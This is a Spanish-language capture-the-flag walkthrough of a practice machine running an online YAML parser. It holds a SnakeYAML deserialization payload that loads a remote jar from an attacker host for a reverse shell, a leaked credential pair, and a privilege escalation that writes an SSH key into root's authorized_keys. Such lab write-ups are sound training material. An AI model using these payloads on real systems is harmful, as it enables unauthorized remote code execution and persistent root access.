Obtener RCE es fácil si enumera e investiga. hay bastante recurso disponibles que pueden ponerte al día.

Bueno comenzamos. 👇👇

Lo Primero que debemos hacer como en todas las cajas que hemos resuelto es recopilar información para ello nos dirigimos a introducir este código de nmap.


Bueno vemos que nos salen dos puertos 22 y 8080.
Donde en el puerto 8080 encontramos un analizador YAML en linea


Procedemos a buscar un exploit en google para ello.

Encontre esto 👇👇👇

https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858




Nos percatamos de este código

!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://attacker-ip/"]
]]
]

Para ello lo introducimos en la pagina web para ver si existe alguna conexión, modificamos donde dice attacker-ip y ponemos nuestra dirección ip de la maquina atacante  


Importante..!!!

Antes de enviar ese codigo abrimos el puerto 80 para ver si genera alguna conexión.



Bueno ahora que tenemos el puerto abierto le damos en PARSE y enviamos el código.





Genial..!! Nos agarro una conexión 

Bueno seguimos con ello. para eso estuve buscando en internet y encontre que podemos explotarlo usando la vulnerabilidad de deserialización. Encontramos que snakeYAML  que se usa en aplicaciones java, es vulnerable a la deserialización. Podemos utilizar esta vulnerabilidad para obtener la ejecución remota de código. Para esto:

Clonamos el repositorio 
 



Bueno ahora debemos crear un script de rev shell


Una vez creado el script procedemos a abrir el archivo java para editarlo, para esto entramos al repositorio clonado. 

Importante..!!! 
el script creado debe ir dentro del repositorio clonado como se puede apreciar en la imagen


Procedemos a ejecutar este comando para editar el archivo java

nano src/artsploit/AwesomeScriptEngineFactory.java

Una vez ejecutado nos aparecerá esto 


A continuación vamos a editarlo , en la cual usaremos Curl para obtener el revshell de nuestra maquina y ejecutarlo.


Ahora vamos a proceder a compilar el archivo java editado.

Dentro del repositorio de github yaml-payload abrimos una terminal e introducimos este código.

javac src/artsploit/AwesomeScriptEngineFactory.java 
jar -cvf yaml-payload.jar -C src/ . 
python3 -m http.server 80


Abriremos otra terminal con el puerto de escucha que hemos puesto en nuestro script de rev shell










Nos dirigimos a la pagina e introducimos este codigo.

!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://10.10.16.24/yaml-payload.jar"] ]] ]






Le damos en parse y podremos obtener nuestro shell inverso como usuario tomcat


Genial..!! Ahora que tenemos acceso al usuario tomcat busquemos la bandera




Bien..!! Nos encontramos con un usuario y una contraseña en la cual nos servira para entrar por el metodo ssh.

Username="admin"
Password="whythereisalimit"


Genial.. Obtenemos la bandera del usuario. 

# Escalada de privilegios ROOT 

Primero vamos a verificar que capacidades de sudo uso nuestro administrador de usuario 


Aquí hay una verificación de condición, primero lo que hace es leer el archivo main.wasm, luego verifica si no es igual a 1, esa parte se ejecuta ; de lo contrario, se ejecutara /bin/sh y también se ejecutara el archivo deploy.sh

Bueno primero veamos el archivo main.wasm para eso vamos a descargarlo a nuestra maquina local para analizarlo. ese archivo se encuentra en opt/wasm-functions. 



Una vez lo tengamos vamos a analizarlo para esto necesitamos decodificarlo para ver que esta sucediendo. lo podemos hacer de esta pagina que encontré en google.

https://webassembly.github.io/wabt/demo/wasm2wat/index.html



para decodificarlo vamos a upload y seleccionamos el archivo que nos hemos descargado main.wasm. 
vamos a cambiar donde esta la linea 4  (i32.const 0))  --- lo cambiamos a (i32.const 1)).
Luego vamos a proceder a codificarlo , copiamos todo el codigo cambiado en 

https://webassembly.github.io/wabt/demo/wat2wasm/index.html



 una vez copiado procedemos a descargarlo. 


Enviamos el archivo descargado test.wasm a la maquina directo /tmp
Para enviarlo abrimos un puerto en una shell donde se encuentra el archivo 
python -m SimpleHTTPServer 80

Luego ejecutamos dentro de /tmp:
wget http://10.10.16.24/test.wasm main.wasm

Luego vamos a conseguir nuestro id_rsa.pub para eso usamos ssh-keygen  una vez tengamos el codigo lo pegamos dentro del usuario de la maquina con este comando. 

echo 'echo "YOUR PUB KEY" > /root/.ssh/authorized_keys' >> deploy.sh

Ahora vamos a proceder a ejecutar 

sudo -u root /usr/bin/go run /opt/wasm-functions/index.go

ese flujo de control ira a la parte else y ejecutara nuestro archivo deploy.sh

Bueno ahora nuestro archivo deploy.sh agregara nuestra clave  id_rsa.pub a las claves autorizadas de root, y poder iniciar sesión como root.


Bueno ahora dentro .ssh donde creamos el id_rsa introducimos 

ssh -i id_rsa root@10.10.10.227
